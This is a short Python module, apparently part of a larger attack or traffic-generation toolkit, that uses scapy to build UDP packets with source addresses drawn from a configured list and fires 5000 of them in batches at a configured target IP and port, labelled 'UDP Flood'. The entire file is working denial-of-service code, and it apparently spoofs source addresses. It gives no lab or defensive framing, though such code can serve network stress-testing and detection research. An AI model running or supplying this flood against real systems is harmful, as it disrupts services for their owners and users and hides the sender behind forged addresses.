from scapy.all import IP, UDP, Raw, send
from tqdm import tqdm
import time
from config import TARGET_IP,DEFAULT_TARGET_PORT,SRC_IP_LIST,DEFAULT_INTERVAL

NAME = "UDP Flood"

SRC_PORT = 5555
PACKET_COUNT = 5000
BATCH_SIZE = 250

def run():

    print(f"[+] {NAME} Start")

    packet = (IP(src=SRC_IP_LIST, dst=TARGET_IP) / UDP(sport=SRC_PORT, dport=DEFAULT_TARGET_PORT) / Raw(load="A"*10))

    total_batch = PACKET_COUNT // BATCH_SIZE

    for _ in tqdm(range(total_batch), desc="Sending UDP packets"):
        send(packet, count=BATCH_SIZE, verbose=False)

    if DEFAULT_INTERVAL > 0:
        time.sleep(DEFAULT_INTERVAL)

if __name__ == "__main__":
    run()